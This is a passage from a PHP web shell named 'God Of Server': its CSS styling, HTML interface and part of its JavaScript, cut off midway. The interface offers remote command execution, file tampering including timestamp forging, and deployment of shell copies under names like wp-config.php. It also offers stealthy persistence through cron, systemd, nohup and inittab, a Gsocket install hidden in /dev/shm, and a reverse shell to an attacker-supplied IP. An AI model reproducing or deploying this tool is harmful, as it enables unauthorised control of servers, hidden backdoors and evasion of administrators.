            transform: translateY(-1px);
        }
        
        .btn-purple {
            background: var(--accent-purple);
            color: white;
        }
        
        .btn-purple:hover {
            background: #7c3aed;
            transform: translateY(-1px);
        }
        
        .file-list {
            background: var(--bg-tertiary);
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }
        
        .file-header {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 600;
            font-style: normal;
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1.5fr 1fr 3fr;
            padding: 16px 20px;
            background: var(--bg-secondary);
            color: var(--text-primary);
            border-bottom: 1px solid var(--border-color);
            font-size: 16px;
        }
        
        .file-item {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            display: grid;
            grid-template-columns: 2fr 1fr 1fr 1.5fr 1fr 3fr;
            padding: 16px 20px;
            border-bottom: 1px solid var(--border-color);
            align-items: center;
            transition: background 0.2s;
            font-size: 16px;
        }
        
        .file-item:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-name {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 500;
            font-style: normal;
            color: var(--text-primary);
            word-break: break-all;
            min-height: 40px;
            display: flex;
            align-items: center;
            font-size: 16px;
        }
        
        .file-actions-container {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            min-height: 40px;
            justify-content: center;
        }
        
        .file-actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            width: 100%;
        }
        
        .file-action-btn {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 500;
            font-style: normal;
            padding: 6px 10px;
            font-size: 13px;
            border-radius: 4px;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            flex-shrink: 0;
            margin-bottom: 4px;
        }
        
        .type-badge {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 500;
            font-style: normal;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            display: inline-block;
            text-align: center;
        }
        
        .type-folder {
            background: rgba(59, 130, 246, 0.2);
            color: var(--accent-blue);
        }
        
        .type-file {
            background: rgba(16, 185, 129, 0.2);
            color: var(--accent-green);
        }
        
        .type-hidden {
            background: rgba(148, 163, 184, 0.2);
            color: var(--text-muted);
        }
        
        .type-zip {
            background: rgba(139, 92, 246, 0.2);
            color: var(--accent-purple);
        }
        
        .terminal-container {
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            border: 1px solid var(--border-color);
        }
        
        .terminal-header {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 500;
            font-style: normal;
            font-size: 16px;
            background: var(--bg-tertiary);
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border-color);
        }
        
        .terminal-output {
            height: 400px;
            overflow-y: auto;
            padding: 20px;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            color: var(--accent-blue);
            background: #000;
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow-wrap: break-word;
            line-height: 1.4;
        }
        
        .terminal-input {
            display: flex;
            gap: 12px;
            padding: 20px;
            background: var(--bg-tertiary);
            border-top: 1px solid var(--border-color);
        }
        
        .terminal-input input {
            flex: 1;
            padding: 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal.active {
            display: flex;
        }
        
        .modal-content {
            background: var(--bg-secondary);
            border-radius: 12px;
            padding: 30px;
            min-width: 500px;
            max-width: 800px;
            max-height: 80vh;
            overflow-y: auto;
            border: 1px solid var(--border-color);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }
        
        .modal-title {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 600;
            font-style: normal;
            font-size: 22px;
            color: var(--text-primary);
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 24px;
            cursor: pointer;
            line-height: 1;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 500;
            font-style: normal;
            font-size: 16px;
            display: block;
            margin-bottom: 8px;
            color: var(--text-primary);
        }
        
        .form-control {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            width: 100%;
            padding: 12px;
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 16px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--accent-blue);
        }
        
        textarea.form-control {
            min-height: 200px;
            font-family: 'Courier New', monospace;
            resize: vertical;
        }
        
        .alert {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 500;
            font-style: normal;
            font-size: 16px;
            padding: 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: none;
        }
        
        .alert-success {
            background: rgba(16, 185, 129, 0.2);
            border: 1px solid var(--accent-green);
            color: var(--accent-green);
        }
        
        .alert-error {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid var(--accent-red);
            color: var(--accent-red);
        }
        
        .alert-info {
            background: rgba(59, 130, 246, 0.2);
            border: 1px solid var(--accent-blue);
            color: var(--accent-blue);
        }
        
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .tool-card {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            background: var(--bg-tertiary);
            padding: 24px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid var(--border-color);
            transition: all 0.3s;
            cursor: pointer;
            font-size: 16px;
        }
        
        .tool-card:hover {
            transform: translateY(-5px);
            border-color: var(--accent-blue);
        }
        
        .tool-title {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 600;
            font-style: normal;
            font-size: 18px;
            color: var(--text-primary);
            margin-bottom: 8px;
        }
        
        .tool-desc {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            color: var(--text-secondary);
            font-size: 16px;
        }
        
        .upload-area {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            border: 2px dashed var(--border-color);
            border-radius: 10px;
            padding: 40px;
            text-align: center;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 16px;
        }
        
        .upload-area:hover {
            border-color: var(--accent-blue);
            background: rgba(59, 130, 246, 0.1);
        }
        
        .upload-area input {
            display: none;
        }
        
        .hidden {
            display: none;
        }
        
        .result-item {
            font-family: 'Ysabeau SC', sans-serif;
            font-optical-sizing: auto;
            font-weight: 400;
            font-style: normal;
            padding: 10px;
            margin: 5px 0;
            border-radius: 6px;
            background: var(--bg-tertiary);
            font-size: 16px;
        }
        
        .result-success {
            border-left: 4px solid var(--accent-green);
        }
        
        .result-error {
            border-left: 4px solid var(--accent-red);
        }
        
        @media (max-width: 1024px) {
            .file-header, .file-item {
                grid-template-columns: 1fr;
                gap: 8px;
            }
            
            .modal-content {
                min-width: 90%;
                margin: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="header-top">
                <div class="logo">God Of Server</div>
                <div class="server-info-header"><?= nl2br(htmlspecialchars($server_info_header)) ?></div>
            </div>
            
            <div class="nav-tabs">
                <button class="nav-btn active" data-section="filemanager">File Manager</button>
                <button class="nav-btn" data-section="terminal">Terminal</button>
                <button class="nav-btn" data-section="deploy">Deploy</button>
                <button class="nav-btn" data-section="defense">Defense</button>
                <button class="nav-btn" data-section="gsocket">Install Gsocket</button>
                <button class="nav-btn" data-section="reverse">Reverse Shell</button>
                <button class="nav-btn" data-section="portcheck">Port Checker</button>
                <button class="nav-btn" data-section="createfile">Create File</button>
                <button class="nav-btn" data-section="createfolder">Create Folder</button>
                <button class="nav-btn" data-section="findbackdoor">Shell Backdoor Find</button>
            </div>
        </header>
        
        <div class="alert" id="global-alert"></div>
        
        <section id="filemanager" class="content-section active">
            <h2 class="section-title">File Manager</h2>
            
            <div class="path-navigation">
                <div class="path-breadcrumb">
                    <a href="?auth=<?= urlencode($AUTH_KEY) ?>&dir=/" class="path-segment">/ (Root)</a>
                    <?php
                    $path_parts = explode('/', trim($directory_contents['current_path'], '/'));
                    $current_path = '';
                    foreach ($path_parts as $index => $part) {
                        if ($part === '') continue;
                        $current_path .= '/' . $part;
                        echo '<a href="?auth=' . urlencode($AUTH_KEY) . '&dir=' . urlencode($current_path) . '" class="path-segment">' . htmlspecialchars($part) . '</a>';
                    }
                    ?>
                </div>
                
                <div class="path-actions">
                    <button class="btn btn-primary" onclick="loadDirectory('<?= htmlspecialchars($directory_contents['home_path']) ?>')">
                        Home Directory
                    </button>
                    <button class="btn btn-warning" onclick="loadDirectory('<?= htmlspecialchars($directory_contents['parent_path']) ?>')">
                        Parent Directory
                    </button>
                    <button class="btn btn-success" onclick="showModal('upload-modal')">
                        Upload File
                    </button>
                </div>
            </div>
            
            <div class="upload-area" onclick="document.getElementById('file-upload').click()">
                <input type="file" id="file-upload" onchange="handleFileUpload()">
                <div style="font-size: 18px; color: var(--accent-blue); margin-bottom: 10px;">Click to upload file</div>
                <div style="color: var(--text-muted); font-size: 14px;">Drag and drop not supported</div>
            </div>
            
            <div class="file-list">
                <div class="file-header">
                    <div>Name</div>
                    <div>Type</div>
                    <div>Size</div>
                    <div>Modified</div>
                    <div>Permissions</div>
                    <div>Actions</div>
                </div>
                
                <?php foreach ($directory_contents['directories'] as $dir): ?>
                <div class="file-item">
                    <div class="file-name">
                        <?= htmlspecialchars($dir['name']) ?>
                    </div>
                    <div><span class="type-badge type-folder">Directory</span></div>
                    <div><?= htmlspecialchars($dir['size']) ?></div>
                    <div><?= htmlspecialchars($dir['modified']) ?></div>
                    <div><?= htmlspecialchars($dir['permissions']) ?></div>
                    <div class="file-actions-container">
                        <div class="file-actions">
                            <button class="file-action-btn btn-primary" onclick="loadDirectory('<?= htmlspecialchars($dir['path']) ?>')">Open</button>
                            <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($dir['path']) ?>')">Rename</button>
                            <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($dir['path']) ?>')">Delete</button>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <?php foreach ($directory_contents['hidden_directories'] as $dir): ?>
                <div class="file-item">
                    <div class="file-name">
                        <?= htmlspecialchars($dir['name']) ?>
                    </div>
                    <div><span class="type-badge type-hidden">Hidden Dir</span></div>
                    <div><?= htmlspecialchars($dir['size']) ?></div>
                    <div><?= htmlspecialchars($dir['modified']) ?></div>
                    <div><?= htmlspecialchars($dir['permissions']) ?></div>
                    <div class="file-actions-container">
                        <div class="file-actions">
                            <button class="file-action-btn btn-primary" onclick="loadDirectory('<?= htmlspecialchars($dir['path']) ?>')">Open</button>
                            <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($dir['path']) ?>')">Rename</button>
                            <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($dir['path']) ?>')">Delete</button>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <?php foreach ($directory_contents['files'] as $file): ?>
                <div class="file-item">
                    <div class="file-name">
                        <?= htmlspecialchars($file['name']) ?>
                    </div>
                    <div>
                        <?php if ($file['extension'] === 'zip'): ?>
                        <span class="type-badge type-zip">ZIP</span>
                        <?php else: ?>
                        <span class="type-badge type-file">File</span>
                        <?php endif; ?>
                    </div>
                    <div><?= htmlspecialchars($file['size']) ?></div>
                    <div><?= htmlspecialchars($file['modified']) ?></div>
                    <div><?= htmlspecialchars($file['permissions']) ?></div>
                    <div class="file-actions-container">
                        <div class="file-actions">
                            <button class="file-action-btn btn-primary" onclick="editFile('<?= htmlspecialchars($file['path']) ?>')">Edit</button>
                            <button class="file-action-btn btn-primary" onclick="viewFile('<?= htmlspecialchars($file['path']) ?>')">View</button>
                            <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($file['path']) ?>')">Rename</button>
                            <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($file['path']) ?>')">Delete</button>
                            <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($file['path']) ?>')">Chmod</button>
                            <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($file['path']) ?>')">Chdate</button>
                            <?php if ($file['extension'] === 'zip'): ?>
                            <button class="file-action-btn btn-purple" onclick="extractZip('<?= htmlspecialchars($file['path']) ?>')">Extract</button>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
                
                <?php foreach ($directory_contents['hidden_files'] as $file): ?>
                <div class="file-item">
                    <div class="file-name">
                        <?= htmlspecialchars($file['name']) ?>
                    </div>
                    <div>
                        <?php if ($file['extension'] === 'zip'): ?>
                        <span class="type-badge type-zip">ZIP</span>
                        <?php else: ?>
                        <span class="type-badge type-hidden">Hidden File</span>
                        <?php endif; ?>
                    </div>
                    <div><?= htmlspecialchars($file['size']) ?></div>
                    <div><?= htmlspecialchars($file['modified']) ?></div>
                    <div><?= htmlspecialchars($file['permissions']) ?></div>
                    <div class="file-actions-container">
                        <div class="file-actions">
                            <button class="file-action-btn btn-primary" onclick="editFile('<?= htmlspecialchars($file['path']) ?>')">Edit</button>
                            <button class="file-action-btn btn-primary" onclick="viewFile('<?= htmlspecialchars($file['path']) ?>')">View</button>
                            <button class="file-action-btn btn-warning" onclick="renameItem('<?= htmlspecialchars($file['path']) ?>')">Rename</button>
                            <button class="file-action-btn btn-danger" onclick="deleteItem('<?= htmlspecialchars($file['path']) ?>')">Delete</button>
                            <button class="file-action-btn btn-success" onclick="chmodItem('<?= htmlspecialchars($file['path']) ?>')">Chmod</button>
                            <button class="file-action-btn btn-warning" onclick="chdateItem('<?= htmlspecialchars($file['path']) ?>')">Chdate</button>
                            <?php if ($file['extension'] === 'zip'): ?>
                            <button class="file-action-btn btn-purple" onclick="extractZip('<?= htmlspecialchars($file['path']) ?>')">Extract</button>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </section>
        
        <section id="terminal" class="content-section">
            <h2 class="section-title">Terminal</h2>
            <div class="terminal-container">
                <div class="terminal-header">
                    <div>System Command Executor</div>
                    <div>Current Directory: <?= htmlspecialchars($directory_contents['current_path']) ?></div>
                </div>
                <div class="terminal-output" id="terminal-output">
                    $ pwd<br><?= htmlspecialchars($directory_contents['current_path']) ?>
                </div>
                <div class="terminal-input">
                    <input type="text" id="terminal-command" placeholder="Enter command...">
                    <button class="btn btn-primary" onclick="executeTerminalCommand()">Execute</button>
                    <button class="btn btn-warning" onclick="executeTerminalCommand(true)">Background</button>
                </div>
            </div>
        </section>
        
        <section id="deploy" class="content-section">
            <h2 class="section-title">Deploy Shell</h2>
            <div class="form-group">
                <label class="form-label">Base Path to Search</label>
                <input type="text" id="base-path" class="form-control" value="/var/www/html">
            </div>
            <div class="form-group">
                <label class="form-label">Shell Filenames (comma separated)</label>
                <textarea id="shell-filenames" class="form-control" rows="3">config.php,index.php,wp-config.php,settings.php,configuration.php</textarea>
                <small style="color: var(--text-muted);">Multiple filenames allowed, separated by commas</small>
            </div>
            <div class="form-group">
                <label style="display: flex; align-items: center; gap: 10px;">
                    <input type="checkbox" id="create-htaccess" checked>
                    <span>Create .htaccess protection (auto-detects server)</span>
                </label>
            </div>
            <div class="form-group">
                <button class="btn btn-primary" onclick="findWritablePaths()">Find Writable Paths</button>
                <button class="btn btn-success" onclick="deployShell()" style="display: none;" id="deploy-btn">Deploy Shell</button>
            </div>
            <div id="deploy-results" style="display: none;">
                <h3 style="margin: 20px 0 10px 0;">Found Writable Paths</h3>
                <div id="paths-list" style="max-height: 300px; overflow-y: auto; background: var(--bg-tertiary); padding: 15px; border-radius: 8px;"></div>
            </div>
            <div id="deploy-output" style="display: none; margin-top: 20px;"></div>
        </section>
        
        <section id="defense" class="content-section">
            <h2 class="section-title">Defense System</h2>
            <div class="alert alert-info" style="display: block;">
                Install persistence mechanisms to protect shell from deletion. All processes run stealthily in background.
            </div>
            
            <div class="tools-grid">
                <div class="tool-card" onclick="installDefense('nohup')">
                    <div class="tool-title">Nohup Persistence</div>
                    <div class="tool-desc">Continuous background process (0.1s intervals)</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('cron')">
                    <div class="tool-title">Cron Job</div>
                    <div class="tool-desc">Scheduled execution every 5 minutes</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('systemd')">
                    <div class="tool-title">Systemd Service</div>
                    <div class="tool-desc">Install as system service (Linux)</div>
                </div>
                
                <div class="tool-card" onclick="installDefense('inittab')">
                    <div class="tool-title">Inittab Entry</div>
                    <div class="tool-desc">Persist through init system</div>
                </div>
                
                <div class="tool-card" onclick="checkDefense()">
                    <div class="tool-title">Check Status</div>
                    <div class="tool-desc">Verify defense mechanisms</div>
                </div>
            </div>
            
            <div id="defense-output" style="margin-top: 20px; display: none;"></div>
        </section>
        
        <section id="gsocket" class="content-section">
            <h2 class="section-title">Install Gsocket</h2>
            <div class="alert alert-success" style="display: block;">
                Gsocket will be installed to /dev/shm/.gs for stealth
            </div>
            <button class="btn btn-primary" onclick="installGsocket()" style="margin-top: 20px;">Install Gsocket</button>
            <div class="terminal-output" id="gsocket-output" style="margin-top: 20px; height: 200px; display: none;"></div>
        </section>
        
        <section id="reverse" class="content-section">
            <h2 class="section-title">Reverse Shell</h2>
            <div class="form-group">
                <label class="form-label">Method</label>
                <select id="backconnect-method" class="form-control">
                    <option value="php">PHP</option>
                    <option value="bash">Bash</option>
                    <option value="python">Python</option>
                    <option value="python3">Python3</option>
                    <option value="perl">Perl</option>
                    <option value="ruby">Ruby</option>
                    <option value="nc">Netcat</option>
                    <option value="socat">Socat</option>
                    <option value="telnet">Telnet</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Your IP Address</label>
                <input type="text" id="backconnect-ip" class="form-control" placeholder="192.168.1.100">
            </div>
            <div class="form-group">
                <label class="form-label">Port</label>
                <input type="text" id="backconnect-port" class="form-control" value="4444">
            </div>
            <button class="btn btn-danger" onclick="startBackconnect()">Start Reverse Shell</button>
        </section>
        
        <section id="portcheck" class="content-section">
            <h2 class="section-title">Port Checker</h2>
            <button class="btn btn-primary" onclick="checkPorts()">Check Open Ports</button>
            <div class="terminal-output" id="portcheck-output" style="margin-top: 20px; height: 300px; display: none;"></div>
        </section>
        
        <section id="createfile" class="content-section">
            <h2 class="section-title">Create File</h2>
            <div class="form-group">
                <label class="form-label">Filename</label>
                <input type="text" id="create-filename" class="form-control" placeholder="newfile.php">
            </div>
            <div class="form-group">
                <label class="form-label">Content</label>
                <textarea id="create-file-content" class="form-control" rows="10"></textarea>
            </div>
            <button class="btn btn-success" onclick="createNewFile()">Create File</button>
        </section>
        
        <section id="createfolder" class="content-section">
            <h2 class="section-title">Create Folder</h2>
            <div class="form-group">
                <label class="form-label">Folder Name</label>
                <input type="text" id="create-foldername" class="form-control" placeholder="newfolder">
            </div>
            <button class="btn btn-success" onclick="createNewFolder()">Create Folder</button>
        </section>
        
        <section id="findbackdoor" class="content-section">
            <h2 class="section-title">Find Shell Backdoors</h2>
            <div class="form-group">
                <label class="form-label">Search Path</label>
                <input type="text" id="search-path" class="form-control" value="/">
            </div>
            <button class="btn btn-primary" onclick="findBackdoors()">Search for Backdoors</button>
            <div class="terminal-output" id="backdoor-output" style="margin-top: 20px; height: 400px; display: none;"></div>
        </section>
        
        <div class="modal" id="edit-file-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Edit File</div>
                    <button class="modal-close" onclick="hideModal('edit-file-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">File Path</label>
                    <input type="text" id="edit-file-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">Content</label>
                    <textarea id="edit-file-content" class="form-control"></textarea>
                </div>
                <button class="btn btn-success" onclick="saveFile()">Save</button>
            </div>
        </div>
        
        <div class="modal" id="view-file-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">View File</div>
                    <button class="modal-close" onclick="hideModal('view-file-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">File Path</label>
                    <input type="text" id="view-file-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">Content</label>
                    <textarea id="view-file-content" class="form-control" readonly></textarea>
                </div>
            </div>
        </div>
        
        <div class="modal" id="rename-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Rename Item</div>
                    <button class="modal-close" onclick="hideModal('rename-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Current Path</label>
                    <input type="text" id="rename-old-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">New Name</label>
                    <input type="text" id="rename-new-name" class="form-control">
                </div>
                <button class="btn btn-success" onclick="performRename()">Rename</button>
            </div>
        </div>
        
        <div class="modal" id="chmod-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Change Permissions</div>
                    <button class="modal-close" onclick="hideModal('chmod-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">File Path</label>
                    <input type="text" id="chmod-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">Permissions (e.g., 0644)</label>
                    <input type="text" id="chmod-mode" class="form-control" value="0644">
                </div>
                <button class="btn btn-success" onclick="performChmod()">Change</button>
            </div>
        </div>
        
        <div class="modal" id="chdate-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Change Timestamp</div>
                    <button class="modal-close" onclick="hideModal('chdate-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">File Path</label>
                    <input type="text" id="chdate-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">New Timestamp</label>
                    <input type="text" id="chdate-timestamp" class="form-control" value="<?= time() ?>">
                    <small style="color: var(--text-muted);">Unix timestamp (current: <?= time() ?>)</small>
                </div>
                <button class="btn btn-success" onclick="performChdate()">Change</button>
            </div>
        </div>
        
        <div class="modal" id="extract-zip-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Extract ZIP Archive</div>
                    <button class="modal-close" onclick="hideModal('extract-zip-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">ZIP File Path</label>
                    <input type="text" id="extract-zip-path" class="form-control" readonly>
                </div>
                <div class="form-group">
                    <label class="form-label">Extract To Directory</label>
                    <input type="text" id="extract-to-path" class="form-control" value="<?= htmlspecialchars($directory_contents['current_path']) ?>">
                </div>
                <button class="btn btn-purple" onclick="performExtractZip()">Extract</button>
            </div>
        </div>
        
        <div class="modal" id="upload-modal">
            <div class="modal-content">
                <div class="modal-header">
                    <div class="modal-title">Upload File</div>
                    <button class="modal-close" onclick="hideModal('upload-modal')">×</button>
                </div>
                <div class="form-group">
                    <label class="form-label">Select File</label>
                    <input type="file" id="modal-file-upload" class="form-control">
                </div>
                <button class="btn btn-success" onclick="performUpload()">Upload</button>
            </div>
        </div>
    </div>
    
    <script>
        let currentDirectory = '<?= addslashes($directory_contents['current_path']) ?>';
        let selectedPaths = [];
        
        document.querySelectorAll('.nav-btn').forEach(btn => {
            btn.addEventListener('click', () => {
                document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
                document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
                
                btn.classList.add('active');
                document.getElementById(btn.dataset.section).classList.add('active');
            });
        });
        
        function loadDirectory(path = null) {
            if (!path) path = currentDirectory;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=change_dir&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else {
                    showAlert('Failed to change directory', 'error');
                }
            });
        }
        
        function handleFileUpload() {
            const fileInput = document.getElementById('file-upload');
            const file = fileInput.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('dest_path', currentDirectory + '/' + file.name);
            formData.append('file', file);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showAlert('File uploaded successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('Upload failed: ' + data.message, 'error');
                }
            });
            
            fileInput.value = '';
        }
        
        function performUpload() {
            const fileInput = document.getElementById('modal-file-upload');
            const file = fileInput.files[0];
            if (!file) {
                showAlert('Please select a file', 'error');
                return;
            }
            
            const formData = new FormData();
            formData.append('action', 'upload');
            formData.append('dest_path', currentDirectory + '/' + file.name);
            formData.append('file', file);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('upload-modal');
                    showAlert('File uploaded successfully', 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert('Upload failed: ' + data.message, 'error');
                }
            });
        }
        
        function editFile(path) {
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=read_file&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('edit-file-path').value = path;
                    document.getElementById('edit-file-content').value = data.content;
                    showModal('edit-file-modal');
                } else {
                    showAlert('Cannot read file: ' + data.message, 'error');
                }
            });
        }
        
        function viewFile(path) {
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=read_file&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('view-file-path').value = path;
                    document.getElementById('view-file-content').value = data.content;
                    showModal('view-file-modal');
                } else {
                    showAlert('Cannot read file: ' + data.message, 'error');
                }
            });
        }
        
        function saveFile() {
            const path = document.getElementById('edit-file-path').value;
            const content = document.getElementById('edit-file-content').value;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=write_file&path=' + encodeURIComponent(path) + '&content=' + encodeURIComponent(content)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('edit-file-modal');
                    showAlert(data.message, 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert(data.message, 'error');
                }
            });
        }
        
        function deleteItem(path) {
            if (!confirm('Are you sure you want to delete this item?')) return;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=delete&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showAlert(data.message, 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert(data.message, 'error');
                }
            });
        }
        
        function renameItem(path) {
            document.getElementById('rename-old-path').value = path;
            const parts = path.split('/');
            document.getElementById('rename-new-name').value = parts[parts.length - 1];
            showModal('rename-modal');
        }
        
        function performRename() {
            const oldPath = document.getElementById('rename-old-path').value;
            const newName = document.getElementById('rename-new-name').value;
            
            if (!newName) return;
            
            const newPath = oldPath.substring(0, oldPath.lastIndexOf('/')) + '/' + newName;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=rename&old_path=' + encodeURIComponent(oldPath) + '&new_path=' + encodeURIComponent(newPath)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('rename-modal');
                    showAlert(data.message, 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert(data.message, 'error');
                }
            });
        }
        
        function chmodItem(path) {
            document.getElementById('chmod-path').value = path;
            showModal('chmod-modal');
        }
        
        function performChmod() {
            const path = document.getElementById('chmod-path').value;
            const mode = document.getElementById('chmod-mode').value;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=chmod&path=' + encodeURIComponent(path) + '&mode=' + encodeURIComponent(mode)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('chmod-modal');
                    showAlert(data.message, 'success');
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showAlert(data.message, 'error');
                }
            });
        }
        
        function chdateItem(path) {
            document.getElementById('chdate-path').value = path;
            document.getElementById('chdate-timestamp').value = Math.floor(Date.now() / 1000);
            showModal('chdate-modal');
        }
        
        function performChdate() {
            const path = document.getElementById('chdate-path').value;
            const timestamp = document.getElementById('chdate-timestamp').value;
            
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=chdate&path=' + encodeURIComponent(path) + '&timestamp=' + encodeURIComponent(timestamp)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    hideModal('chdate-modal');
                    showAlert(data.message, 'success');
